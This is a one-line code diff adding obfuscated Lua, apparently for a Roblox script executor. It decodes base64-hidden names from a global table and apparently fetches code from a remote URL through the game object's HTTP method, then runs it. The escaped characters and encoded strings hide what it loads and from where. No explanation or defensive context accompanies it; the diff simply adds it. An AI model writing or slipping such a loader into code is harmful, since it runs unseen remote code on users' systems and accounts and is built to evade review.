@@ -1,0 +1,1 @@
+local a=crypt;local b=getgenv()local c=a["\98\97\115\101\54\52\100\101\99\111\100\101"]local d=b[c(b['h'][1])]local e=d(c(b['h'][2]))()local f=game;local g=f[e]d(g(true,c(b['h'][3])))()
